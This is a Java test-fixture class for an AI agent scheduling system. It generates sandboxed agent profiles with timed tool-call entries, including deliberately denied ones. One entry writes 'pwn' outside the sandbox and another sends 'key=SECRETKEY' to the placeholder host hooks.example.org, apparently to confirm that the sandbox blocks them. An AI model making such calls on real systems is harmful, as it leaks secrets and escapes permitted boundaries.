package io.oryxos;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

/**
 * A throw-away directory with profiles, a sandbox workspace and a SQLite file, plus the Spring
 * arguments that point an application context at it. Cron times are all "1 January 03:00", so no
 * schedule can fire by itself while a test runs; tests drive runs through the API or fire().
 */
final class ScheduleTestEnvironment {
  static final String FAR_CRON = "0 0 3 1 1 *";

  final Path root;
  final Path profiles;
  final Path allowed;
  final Path forbidden;
  final Path database;

  ScheduleTestEnvironment(Path root) throws IOException {
    this.root = root;
    this.profiles = Files.createDirectories(root.resolve("profiles"));
    this.allowed = Files.createDirectories(root.resolve("ws/allowed"));
    this.forbidden = Files.createDirectories(root.resolve("ws/forbidden"));
    this.database = root.resolve("schedule.db");
    Files.writeString(allowed.resolve("hello.txt"), "HELLO-FROM-ALLOWED");
    writeDefaultProfiles();
  }

  static String slash(Path path) {
    return path.toString().replace('\\', '/');
  }

  String slashForbidden(String file) {
    return slash(forbidden.resolve(file));
  }

  private void writeDefaultProfiles() throws IOException {
    Files.writeString(
        profiles.resolve("sched-demo.yaml"),
        profile(
            "sched-demo",
            "[file_read, file_write, http_get]",
            "5",
            sandbox(),
            entry("ok", FAR_CRON, "Asia/Shanghai", "hello from the schedule"),
            entry(
                "read",
                FAR_CRON,
                "UTC",
                "tool:file_read {\"path\":\"" + slash(allowed.resolve("hello.txt")) + "\"}"),
            entry(
                "denied-write",
                FAR_CRON,
                "UTC",
                "tool:file_write {\"path\":\""
                    + slashForbidden("created-by-schedule.txt")
                    + "\",\"content\":\"pwn\"}"),
            entry(
                "denied-http",
                FAR_CRON,
                "UTC",
                "tool:http_get {\"url\":\"https://hooks.example.org/x?key=SECRETKEY\"}")));
    // Same local id "ok" as sched-demo, a different agent: must stay independent.
    Files.writeString(
        profiles.resolve("sched-other.yaml"),
        profile(
            "sched-other",
            "[]",
            "5",
            null,
            entry("ok", FAR_CRON, "America/New_York", "hello from the other agent")));
    // max_iterations is not a number, so every run of this agent fails inside the real ReAct loop.
    Files.writeString(
        profiles.resolve("sched-broken.yaml"),
        profile(
            "sched-broken",
            "[]",
            "\"not-a-number\"",
            null,
            entry("boom", FAR_CRON, "UTC", "this run will fail")));
  }

  private String sandbox() {
    return "  sandbox:\n    read_roots: [\""
        + slash(allowed)
        + "\"]\n    write_roots: [\""
        + slash(allowed)
        + "\"]\n";
  }

  static String entry(String id, String cron, String zone, String message) {
    return "  - id: "
        + id
        + "\n    cron: \""
        + cron
        + "\"\n    zone: "
        + zone
        + "\n    message: '"
        + message.replace("'", "''")
        + "'\n";
  }

  static String profile(
      String name, String tools, String maxIterations, String sandbox, String... schedules) {
    return "name: "
        + name
        + "\ndescription: schedule test\nprovider: {name: mock, model: m, temperature: 0.2}\n"
        + "tools: "
        + tools
        + "\nsettings:\n  max_iterations: "
        + maxIterations
        + "\n"
        + (sandbox == null ? "" : sandbox)
        + "schedules:\n"
        + String.join("", schedules);
  }

  /** Spring arguments (highest precedence) for a web-less context on this environment. */
  List<String> args(String... extra) {
    List<String> args = new ArrayList<>();
    args.add("--logging.level.root=WARN");
    args.add("--oryxos.profile-directory=" + slash(profiles));
    args.add("--spring.datasource.url=jdbc:sqlite:" + slash(database));
    args.add("--oryxos.memory.markdown-path=" + slash(root.resolve("MEMORY.md")));
    args.add("--oryxos.sandbox.read-roots=" + slash(allowed));
    args.add("--oryxos.sandbox.write-roots=" + slash(allowed));
    args.addAll(List.of(extra));
    return args;
  }
}
